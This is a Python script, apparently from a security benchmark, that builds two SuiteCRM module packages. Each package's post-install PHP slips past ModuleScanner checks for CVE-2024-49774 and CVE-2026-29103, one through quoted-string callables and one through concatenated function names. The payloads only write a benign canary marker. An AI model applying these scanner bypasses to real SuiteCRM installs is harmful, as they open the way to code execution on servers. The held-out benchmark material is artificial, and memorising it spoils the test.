#!/usr/bin/env python3
"""Build the two crafted SuiteCRM Module Loader Packages (MLPs) for the benchmark.

1. original_module.zip - CVE-2024-49774 bypass: uses T_CONSTANT_ENCAPSED_STRING
   ('file_get_contents' as a quoted string callable). Passes ModuleScanner on
   V0 (v7.14.5), blocked on V1 (v7.15.0+).

2. bypass_module.zip - CVE-2026-29103 bypass: uses string concatenation to
   build the function name from pieces, exploiting the $checkFunction reset
   on single-char tokens. Passes on V1 (v7.15.0), blocked on V2 (v7.15.1).

Both modules use a post_install script as the payload. The script is scanned
by ModuleScanner before installation; if it passes, SuiteCRM require()s it
during install, writing the canary marker. BENIGN canary only.
"""
import io
import os
import zipfile


def _manifest(name: str, description: str) -> str:
    return f'''<?php
$manifest = array(
    'acceptable_sugar_versions' => array(''),
    'acceptable_sugar_flavors' => array('CE'),
    'readme' => '',
    'key' => '{name}',
    'author' => 'PCB Benchmark',
    'description' => '{description}',
    'icon' => '',
    'is_uninstallable' => true,
    'name' => '{name}',
    'published_date' => '2026-01-01',
    'type' => 'module',
    'version' => '1.0.0',
);
$installdefs = array(
    'id' => '{name}',
    'post_execute' => array(
        '<basepath>/scripts/post_install.php',
    ),
);
'''


def _original_post_install() -> str:
    """CVE-2024-49774 bypass: quoted string function call as post_install script."""
    return '''<?php
// CVE-2024-49774 bypass: quoted-string callable evades pre-8.7.1 ModuleScanner.
// The scanner (v7.14.5) only checks T_STRING tokens, not T_CONSTANT_ENCAPSED_STRING.
// Benign benchmark canary: reads a planted marker, writes to web-accessible file.

$c = 'file_get_contents'('/tmp/pcb_canary.txt');
'file_put_contents'('/var/www/html/pcb_marker_original.txt', $c);
'''


def _bypass_post_install() -> str:
    """CVE-2026-29103 bypass: string concatenation as post_install script."""
    return '''<?php
// CVE-2026-29103 bypass: string concatenation evades v7.15.0 token-based scanner.
// Neither 'file_get' nor '_contents' individually matches the blacklist.
// ('file_get'.'_contents')(...) never has $checkFunction=true before the call '('.
// Benign benchmark canary: reads a planted marker, writes to web-accessible file.

$c = ('file_get' . '_contents')('/tmp/pcb_canary.txt');
('file_put' . '_contents')('/var/www/html/pcb_marker_bypass.txt', $c);
'''


def build_module(name: str, description: str, post_install_php: str, output_path: str):
    """Build a Module Loader Package zip."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.writestr('manifest.php', _manifest(name, description))
        zf.writestr('scripts/post_install.php', post_install_php)
    with open(output_path, 'wb') as f:
        f.write(buf.getvalue())
    print(f"Built: {output_path} ({len(buf.getvalue())} bytes)")


def main():
    script_dir = os.path.dirname(os.path.abspath(__file__))

    build_module(
        name='PCBOriginal',
        description='PCB benchmark canary module (original CVE-2024-49774 bypass)',
        post_install_php=_original_post_install(),
        output_path=os.path.join(script_dir, 'original_module.zip'),
    )

    build_module(
        name='PCBBypass',
        description='PCB benchmark canary module (CVE-2026-29103 concat bypass)',
        post_install_php=_bypass_post_install(),
        output_path=os.path.join(script_dir, '_heldout', 'bypass_module.zip'),
    )


if __name__ == '__main__':
    main()
